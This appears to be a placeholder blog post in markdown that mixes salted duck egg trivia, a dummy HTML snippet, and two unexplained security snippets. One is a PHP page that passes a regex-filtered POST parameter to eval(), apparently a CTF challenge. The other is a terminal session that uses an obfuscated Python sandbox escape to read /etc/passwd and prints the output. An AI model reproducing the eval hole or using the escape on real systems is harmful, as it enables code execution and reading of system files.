---
title: My Second Post!
date: '2015-05-06T23:46:37.121Z'
---

Wow! I love blogging so much already.

Did you know that "despite its name, salted duck eggs can also be made from
chicken eggs, though the taste and texture will be somewhat different, and the
egg yolk will be less rich."?
([Wikipedia Link](https://en.wikipedia.org/wiki/Salted_duck_egg))

Yeah, I didn't either.

```html
<head>
  This is the head.
</head>
<body>
  This is the body.
</body>
```

```php
<?php
	if(sizeof($_REQUEST)===2&& sizeof($_POST)===2){
	$cmd=$_POST['cmd'];
	$submit=$_POST['submit'];
	if(isset($cmd)&& isset($submit)){
		if(preg_match_all('/^(\$|\(|\)|\_|\[|\]|\=|\;|\+|\"|\.)*$/', $cmd, $matches)){
			echo "<div class=\"success\">Command executed !</div>";
			eval($cmd);
		}else{
			die("<div class=\"error\">NOT ALLOWED !</div>");
		}
	}else{
		die("<div class=\"error\">NOT ALLOWED !</div>");
	}
	}else if ($_SERVER['REQUEST_METHOD']!="GET"){
		die("<div class=\"error\">NOT ALLOWED !</div>");
	}
	 ?>
```

```python
xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234
Welcome to our Directory Manager, what do you want to execute :
[eval('[].__cla{0}{0}__.__ba{0}e__.__{0}ubcla{0}{0}e{0}__()'.format(dir()[0][9]))[40]('/etc/pa{0}{0}wd'.format(dir()[0][9])).read()]
['root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nfword:x:1000:1000::/home/fword/:/bin/bash\nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin\n']
```
